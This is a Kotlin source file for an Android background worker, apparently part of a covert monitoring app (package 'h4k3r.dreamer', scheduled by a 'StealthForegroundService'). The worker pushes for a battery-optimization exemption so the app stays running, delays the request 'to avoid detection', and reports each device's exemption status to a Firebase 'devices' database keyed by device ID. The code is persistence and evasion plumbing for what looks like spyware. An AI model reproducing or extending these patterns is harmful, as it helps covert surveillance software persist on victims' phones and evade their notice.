package com.h4k3r.dreamer

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.google.firebase.database.FirebaseDatabase

/**
 * Worker class for requesting battery optimization exemption.
 * This worker is scheduled by StealthForegroundService to periodically
 * check and request battery optimization exemption to ensure long-running services.
 */
class BatteryOptimizationWorker(context: Context, params: WorkerParameters) : Worker(context, params) {
    companion object {
        private const val TAG = "BatteryOptimizationWorker"
    }

    override fun doWork(): Result {
        Log.d(TAG, "BatteryOptimizationWorker started")
        
        try {
            // Check if the device is already ignoring battery optimizations
            if (!isIgnoringBatteryOptimizations()) {
                // If not, try to request exemption using different strategies
                requestBatteryOptimizationExemption()
            } else {
                Log.d(TAG, "Device is already ignoring battery optimizations")
                updateBatteryOptimizationStatus(true)
            }
            
            return Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "Error in BatteryOptimizationWorker", e)
            updateBatteryOptimizationStatus(false)
            return Result.retry()
        }
    }
    
    private fun isIgnoringBatteryOptimizations(): Boolean {
        val packageName = applicationContext.packageName
        val powerManager = applicationContext.getSystemService(Context.POWER_SERVICE) as PowerManager
        
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            powerManager.isIgnoringBatteryOptimizations(packageName)
        } else {
            // For devices below Android M, battery optimization settings don't exist
            true
        }
    }
    
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            return
        }
        
        val packageName = applicationContext.packageName
        
        try {
            // Try the stealthy approach first - using notification trick
            val stealthIntent = Intent().apply {
                action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                data = Uri.parse("package:$packageName")
                flags = Intent.FLAG_ACTIVITY_NEW_TASK
            }
            
            // Start the intent with a delay to avoid detection
            Thread {
                try {
                    Thread.sleep(5000)
                    applicationContext.startActivity(stealthIntent)
                    Log.d(TAG, "Requested battery optimization exemption via stealth intent")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to request battery optimization exemption via stealth intent", e)
                    
                    // Fallback to direct settings navigation
                    try {
                        val fallbackIntent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK
                        }
                        applicationContext.startActivity(fallbackIntent)
                        Log.d(TAG, "Opened battery optimization settings")
                    } catch (e2: Exception) {
                        Log.e(TAG, "Failed to open battery optimization settings", e2)
                    }
                }
            }.start()
        } catch (e: Exception) {
            Log.e(TAG, "Error requesting battery optimization exemption", e)
        }
    }
    
    private fun updateBatteryOptimizationStatus(isExempt: Boolean) {
        try {
            // Update Firebase with the current battery optimization status
            val database = FirebaseDatabase.getInstance()
            val deviceRef = database.getReference("devices")
                .child(DeviceUtils.getDeviceId(applicationContext))
                .child("batteryOptimization")
            
            deviceRef.setValue(if (isExempt) "exempt" else "not_exempt")
            Log.d(TAG, "Updated battery optimization status: $isExempt")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to update battery optimization status", e)
        }
    }
}